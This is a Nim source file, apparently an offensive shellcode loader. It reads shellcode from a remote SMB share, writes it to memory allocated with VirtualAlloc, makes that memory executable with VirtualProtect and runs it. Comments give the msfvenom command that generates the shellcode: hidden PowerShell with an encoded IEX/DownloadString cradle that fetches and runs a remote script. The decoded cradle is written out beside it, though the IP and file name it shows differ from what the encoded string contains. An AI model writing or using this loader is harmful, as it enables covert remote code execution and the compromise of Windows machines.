import winim/lean
import osproc

#[msfvenom -p windows/x64/exec CMD="powershell.exe -w hidden -ep bypass -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAyADQANgAuADMANAAvAHAAdwBuAC4AcABzADEAIgApAA==" -f raw -o shellcode.bin]#
#[IEX(New-Object Net.Webclient).DownloadString('http://192.168.173.34/shell.ps1') <-- This is the base64 encoded payload]#

var payload = "\\\\192.168.173.34\\smb\\shellcode.bin"  
var file: File  = open(payload, fmRead) 


var fsize = file.getFileSize()
var shellcode = newSeq[byte](fsize)
discard file.readBytes(shellcode, 0, fsize)

let memAddr = VirtualAlloc(
    nil,
    len(shellcode),
    MEM_COMMIT,
    PAGE_READWRITE
    )
copyMem(
    memAddr,
    shellcode[0].addr, 
    len(shellcode)
    )

var PrevPro: DWORD = 0
let virPro = VirtualProtect(
    memAddr, 
    cast[SIZE_T](len(shellcode)), 
    PAGE_EXECUTE_READ, 
    addr PrevPro
    )


let f = cast[proc(){.nimcall.}](memAddr)
f()



  




